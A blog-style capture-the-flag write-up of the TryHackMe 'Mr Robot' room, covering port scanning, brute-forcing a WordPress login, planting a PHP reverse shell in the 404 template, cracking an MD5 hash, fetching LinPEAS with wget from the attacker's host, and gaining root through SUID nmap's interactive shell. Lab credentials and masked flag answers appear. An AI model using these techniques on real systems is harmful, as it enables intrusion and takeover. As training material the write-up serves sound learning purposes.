---
title: "Try Hack Me: Mr Robot CTF"
date: 2020-12-31
tags: [CTF]
excerpt: "Nmap, Dirbuster, WordPress, LinPEAS"
---

## CTF Introduction
[Mr Robot CTF](https://tryhackme.com/room/mrrobot) is a Try Hack Me room created by [ben](https://tryhackme.com/p/ben). The room is rated as a medium CTF, making it a good challenge and an opportunity to learn about some niche concepts/tools. As the title suggests, it is themed around the TV show Mr. Robot.

--- 

## Questions
Q1: What is key 1?

A1:`0734**************************b9`

Q2: What is key 2?

A2: `822c**************************59`

Q3: What is key 3?

A3: `0478**************************e4`

## Initial Nmap
```
┌─[user@parrotOS]─[~/Documents/THM/MrRobotCTF]
└──╼ $nmap -sC -sV -oN initial 10.10.128.5
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-31 02:08 GMT
Nmap scan report for 10.10.128.5
Host is up (0.31s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```
It appears there isn't anything to see besides the webpage, so I'll check it out.

## IP/
### Initial Inspection
The webpage starts with a mock Linux startup and then offers commands for the user to run:

<img src="{{ site.url }}{{ site.baseurl }}/images/THM-MrRobotCTF/commands.png" alt="Commands">

Looking at all of them, they seem mostly for flavour with no actual purpose. The page source also contains nothing of interest, but does have a HTML comment saying "YOU ARE NOT ALONE".

### Dirbuster
I started up Dirbuster to find any hidden files or directories. It found quite a lot, but of noteworthy importance is:
* `/robots.txt`
* `/login`
* `/wp-login.php`
* `/admin`

## IP/robots.txt
Here I see two files:

<img src="{{ site.url }}{{ site.baseurl }}/images/THM-MrRobotCTF/robots.png" alt="robots.txt">

I used `Wget` to download the dictionary file and navigated to `{IP}/key-1-of-3.txt` to get the first key.

## IP/login & IP/wp-login
Both of these URLs redirect to `{IP}/wp-login`, which as the name suggests, is a WordPress login page. As I don't have any usernames or passwords at this point in time, I decided to enumerate further.

### WPScan
I used `wpscan --url http://{IP} --enumerate u` to try and discover usernames but found nothing.

### Brute Force
I decided to try brute forcing the credentials using the dictionary file obtained before. I did this using BurpSuite as follows:
1. Capture a dummy login request.
2. Send the request to intruder.
3. Go to the positions tab, set the attack type to "cluster bomb" and clear any default positons.
4. Mark the `log` and `pwd` values as positions. By now, the request should look as follows:
 <img src="{{ site.url }}{{ site.baseurl }}/images/THM-MrRobotCTF/intruder.png" alt="BurpSuite intruder setup">
5. Move to the payloads tab and load `fsocity.dic` in both payload sets 1 and 2.
6. Start the attack and wait.

After some time, a request using the username `Elliot` and password `true` is made. The length of this request was larger than the others, indicating that the username is `Elliot`.

I then cancelled the attack and started hydra to find the password for user `Elliot`. See [Test WordPress Logins With Hydra on Kali Linux](https://linuxconfig.org/test-wordpress-logins-with-hydra-on-kali-linux) by Nick Congleton to learn more about this.

After Hydra found the password `ER28-0652`, I logged in to WordPress and was greeted with an admin panel at `{IP}/wp-admin`.

## IP/wp-admin
### Enumeration
I first navigated to the users panel to see what, if any, other users were available. Here, I saw the user `Elliot` that I was logged in as and another `mich05654`, which had less privileges.

<img src="{{ site.url }}{{ site.baseurl }}/images/THM-MrRobotCTF/users.png" alt="WordPress users">

As this is a WordPress site, I decided to try and change the 404 error page to a PHP reverse shell through the following:
1. Copy `/usr/share/webshells/php/php-reverse-shell.php` to the working directory.
2. Edit the script's IP to the attacking machine's THM VPN IP and port to anything (I used 1337).
3. On the WordPress admin panel, navigate to Appearance > Editor.
4. Open the `404 Template` file.
5. Copy the reverse shell code and replace the `404 Template` (`404.php`) with it.
6. Click the "Update File" button.
 <img src="{{ site.url }}{{ site.baseurl }}/images/THM-MrRobotCTF/404.png" alt="Edited 404 page">
7. Start a listener using `sudo nc -lnvp 1337`.
8. Navigate to `{IP}/wp-admin/404.php` and see the reverse shell worked!

<img src="{{ site.url }}{{ site.baseurl }}/images/THM-MrRobotCTF/rshell.png" alt="Reverse shell success">

## Reverse Shell
### Enumeration
First thing is to check who I am. A simple `id` command shows that I am logged in as `daemon`.

Navigating to `/home` shows one home directory for the user `robot`. Inside, there are two files:
* `key-2-of-3.txt` - no permission to read.
* `password.raw-md5` - permission to read, contains the hashed credentials: `robot:c3fcd3d76192e4007dfb496cca67e13b`.

I used [Crackstation](https://crackstation.net/) to crack the hash which returned the password: `abcdefghijklmnopqrstuvwxyz`.

Logging in to this user was as simple as `su -l robot`. 

<img src="{{ site.url }}{{ site.baseurl }}/images/THM-MrRobotCTF/user-robot.png" alt="Switching to user `robot`">

### Privilege Escalation
Now that I am the user `robot`, I can view and get the second key with a simple `cat`.

This being a CTF means I can safely assume the third key will be in `root`'s folder. As such, some PrivEsc is needed.

`sudo -l` reveals `robot` has no permissions and `groups` reveals no special/other groups.

To easily enumerate the system, I uploaded [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) using a Python server as follows:
1. Copy `linpeas.sh` to the working directory.
2. Start a Python webserver using `python3 -m http.server`.
3. In the reverse shell, navigate to `/tmp` and run `wget http://{attacker IP}:8000/linpeas.sh`.
4. Once it has finished downloading, run `chmod +x linpeas.sh`.
5. Finally, run `./linpeas.sh`.

The information that LinPEAS flagged as important was:
* Linux version 3.13.0-55-generic
* SUID on `/usr/local/bin/nmap`

Using [GTFObins](https://gtfobins.github.io/gtfobins/nmap/#limited-suid), I tried to abuse its SUID Nmap PrivEsc but it did not work. Instead, it returned an error saying "unrecognised option '--script...'". It also noted that the version of Nmap being used is 3.81. I did not double check, but I believe this version is too old and does not have the ability to run scripts.

As such, I searched for Nmap 3.81 PrivEsc's and found an article by [Penetration Testing Lab](https://pentestlab.blog/category/privilege-escalation/). This article showed one way to get a root shell through an "interactive" Nmap client. It was done as follows:
1. `nmap --interactive`
2. `!sh`
3. `whoami`

It's as simple as that!

<img src="{{ site.url }}{{ site.baseurl }}/images/THM-MrRobotCTF/root.png" alt="Switching to root">

Now, `cd /root` and `cat key-3-of-3.txt` and that's the challenge complete!

## Summary
All in all, this was a really fun and challenging room. Huge props to ben for such a well made challenge that also fits the theme of the TV show. My biggest takeaway from this room was definitely the interactive Nmap shell to get root privileges. I definitely recommend trying this room, even more so if you are a fan of Mr. Robot.

<img src="https://tryhackme-badges.s3.amazonaws.com/cjboyd.png" alt="TryHackMe">